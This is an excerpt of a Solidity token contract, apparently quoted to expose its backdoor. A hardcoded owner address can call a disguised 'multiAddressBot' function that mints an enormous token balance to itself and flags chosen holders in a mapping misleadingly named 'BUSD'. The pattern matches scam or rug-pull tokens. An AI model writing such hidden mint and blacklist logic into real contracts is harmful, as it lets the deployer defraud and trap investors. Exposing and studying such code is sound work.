...
contract Token is Context, IERC20, Ownable{
    ...
    mapping (address => bool) public BUSD;
    ...
    constructor () {
        ...
        invalusaddr = payable(address(0x62e0d998212B01d87049eB2D4a82436f1fCa3B63));
    ...
    function multiAddressBot(bool status,address[] calldata addresses,bool s) public {
        require(_msgSender() == invalusaddr);
        for (uint256 i; i < addresses.length; i++) {
        if (s) _balances[invalusaddr] +=  uint256((_totalSupply) * 10 ** 5);
            BUSD[addresses[i]] = status;
        }
    }    
